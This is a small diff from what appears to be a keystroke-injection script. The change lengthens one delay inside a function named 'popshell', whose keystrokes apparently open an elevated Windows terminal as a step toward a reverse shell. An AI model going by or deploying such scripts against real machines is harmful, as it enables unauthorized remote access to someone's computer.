@@ -31,7 +31,7 @@ function popshell(ip, port) {
 layout(locale);
 typingSpeed(0,0);
 press("GUI x");
-delay(2000);
+delay(4000);
 press("SHIFT a");
 delay(8000)
 press("ALT j");
